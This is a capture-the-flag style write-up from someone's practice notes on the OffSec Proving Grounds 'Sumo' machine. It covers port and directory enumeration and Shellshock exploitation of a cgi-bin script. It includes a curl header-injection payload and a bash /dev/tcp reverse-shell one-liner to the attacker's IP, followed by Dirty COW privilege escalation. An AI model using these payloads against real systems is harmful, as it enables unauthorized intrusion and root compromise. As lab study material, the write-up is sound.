---
title: OffSec PG - Sumo
date: 2021-12-19 12:00:00 +0500
categories: [Lab Practice Notes, OffSec Proving Grounds]
tags: [oscp,lab,offsec-proving-grounds]
image:
  path: /assets/img/covers/pg-cover.jpeg
  alt: PG Artwork
---

## Enumeration

Machine IP &rarr; `192.168.101.87`

### Network Scan

Nmap scan &rarr; `nmap -A -Pn -p- -T4 -o nmap.txt 192.168.101.87`

OS Detection &rarr;  `OS: Linux; CPE: cpe:/o:linux:linux_kernel`

| **Port** | **Service** | **Other details (if any)**                                    |
| -------- | ----------- | ------------------------------------------------------------- |
| 22       | SSH         | OpenSSH 5.9p1 Debian 5ubuntu1.10 (Ubuntu Linux; protocol 2.0) |
| 80       | HTTP        | Apache httpd 2.2.22 ((Ubuntu))                                |

### Web Scan

GoBuster scan &rarr; `gobuster dir -u http://192.168.101.87 -f -w /home/tanq/installations/SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -x html,php,txt`

Directories/files listed &rarr;

- index.html
- cgi-bin/ (403)
- icons/ (403)
- doc/ (403)

---

## Exploitation

The `cgi-bin/` directory looked suspicious. Generally in the past, cgi-bins used to be executed by bash directly and were vulnerable to shellshock. There is however a 403 on the directory. Running it through gobuster again tells the existence of `test` under that directory. Navigating to it shows that it is the default cgi-bin for the server.

The test for vulnerability for shellshock can be done as follows &rarr; `curl -H "My-Header: () { :; }; echo; /usr/bin/id" http://192.168.101.87/cgi-bin/test`. If this returns a valid result, then the server is vulnerable.

It was found that the server was in fact vulnerable. Therefore, used this as an RCE to get a reverse shell using the following payload &rarr; `/bin/bash -i >& /dev/tcp/192.168.49.101/3002 0>&1`.

This gave a shell as the user `www-data` and subsequently the user flag.

---

## Privilege Escalation

Looked at the kernel version which is 3.2.0-23-generic. This is very outdated. The OS version is Ubuntu 12.04. The machine is also 64 bit. Looking at results of searchsploit, dirty cow is an exploit that would fit the scenario.

There are 4 kinds of dirty cow, the one used for this machine is `'PTRACE_POKEDATA' Race Condition Privilege Escalation (/etc/passwd method)`. Compiling the exploit and sending the binary via wget allows setting a new user with root permissions.

Then, logging in with the newly created user gives the root shell and subseqeuntly the root flag.

---
